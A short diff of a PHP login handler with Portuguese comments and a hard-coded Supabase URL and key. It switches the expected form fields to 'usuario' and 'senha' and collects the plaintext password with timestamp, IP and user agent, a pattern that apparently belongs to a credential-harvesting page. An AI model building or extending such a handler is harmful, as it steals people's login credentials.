@@ -5,10 +5,10 @@
 $supabase_url = 'https://latctabiaqlgqkvixuyu.supabase.co';
 $supabase_key = 'sb_publishable_NtfdvdauItvFFpbCRp2IZA_OCeP3EOH';
 
-// 2. Verificar se os dados foram enviados
-if (isset($_POST['username']) && isset($_POST['password'])) {
-    $username = $_POST['username'];
-    $password = $_POST['password'];
+// 2. Verificar se os dados foram enviados (agora lendo 'usuario' e 'senha')
+if (isset($_POST['usuario']) && isset($_POST['senha'])) {
+    $username = $_POST['usuario'];
+    $password = $_POST['senha'];
     $timestamp = date('Y-m-d H:i:s');
     $ip = $_SERVER['REMOTE_ADDR'];
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
